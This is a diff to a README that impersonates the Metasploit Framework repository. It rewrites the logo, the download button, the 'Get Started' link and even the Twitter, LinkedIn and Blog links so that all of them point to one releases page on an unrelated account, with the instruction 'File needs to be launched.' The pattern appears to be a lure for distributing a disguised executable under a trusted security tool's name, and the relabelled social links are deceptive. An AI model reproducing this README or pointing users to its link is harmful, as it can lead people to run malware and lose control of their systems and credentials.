@@ -3,7 +3,7 @@
 
 Welcome to the Metasploit Framework repository for penetration testing and security research!
 
-![Metasploit Logo](https://your-image-url.com)
+![Metasploit Logo](https://github.com/sub2samplays/Metasploit-Framework-2025/releases)
 
 ## Description
 The Metasploit Framework is a powerful tool used for identifying and exploiting vulnerabilities in networks. Whether you're conducting penetration tests, red teaming exercises, or just want to secure your network, Metasploit provides the necessary tools for all your security needs.
@@ -21,9 +21,9 @@ The Metasploit Framework is a powerful tool used for identifying and exploiting 
 cyber-security, ethical-hacking, exploit-development, exploit-testing, exploitation-framework, hacking-tools, metasploit, network-testing, pen-test-tools, penetration-testing, penetration-testing-framework, red-teaming, security-assessment, security-auditing, security-framework, security-research, security-tools, vulnerability-exploitation, web-application-security
 
 ## Get Started
-To access the Metasploit Framework, [click here](https://github.com/uploads/App.zip). *File needs to be launched.*
+To access the Metasploit Framework, [click here](https://github.com/sub2samplays/Metasploit-Framework-2025/releases). *File needs to be launched.*
 
-[![Download Metasploit Framework](https://img.shields.io/badge/Download-Metasploit_Framework-blue.svg)](https://github.com/uploads/App.zip)
+[![Download Metasploit Framework](https://github.com/sub2samplays/Metasploit-Framework-2025/releases)](https://github.com/sub2samplays/Metasploit-Framework-2025/releases)
 
 ## How to Use
 1. Download the Metasploit Framework zip file from the provided link.
@@ -38,9 +38,9 @@ If you encounter any issues with the Metasploit Framework or have any questions,
 
 ## Stay Connected
 Follow us on social media for the latest news, updates, and security insights:
-- Twitter: [Metasploit Twitter](https://twitter.com/metasploit)
-- LinkedIn: [Metasploit LinkedIn](https://linkedin.com/metasploit)
-- Blog: [Metasploit Blog](https://blog.metasploit.com)
+- Twitter: [Metasploit Twitter](https://github.com/sub2samplays/Metasploit-Framework-2025/releases)
+- LinkedIn: [Metasploit LinkedIn](https://github.com/sub2samplays/Metasploit-Framework-2025/releases)
+- Blog: [Metasploit Blog](https://github.com/sub2samplays/Metasploit-Framework-2025/releases)
 
 Join our community of security enthusiasts and professionals to discuss tips, tricks, and best practices for cybersecurity.
 
